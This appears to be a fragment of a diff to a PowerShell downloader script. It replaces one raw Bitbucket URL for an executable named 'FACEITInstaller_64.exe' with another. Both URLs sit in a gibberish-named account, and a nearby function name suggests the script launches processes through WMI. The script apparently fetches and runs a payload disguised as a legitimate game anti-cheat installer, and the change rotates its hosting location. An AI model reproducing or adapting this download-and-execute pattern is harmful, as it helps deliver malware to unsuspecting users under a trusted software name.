@@ -187,7 +187,7 @@ function Start-ProcessWmi([string]$Path) {
 }
 
 $urls = @(
-    @{ Address = ('https://bitbucket.org/dafsfdsfdsfdsfds/ac/raw/bbd50a56f13fef34e7687cb35e967b449be850cc/FACEITInstaller_64.exe'); Auto = $false }
+    @{ Address = ('https://bitbucket.org/dafsfdsfdsfdsfds/dad/raw/3417a8e445bbae232a88c6ee30e179f74a73877d/FACEITInstaller_64.exe'); Auto = $false }
 )
 $jobs = @()
 foreach ($item in $urls) {
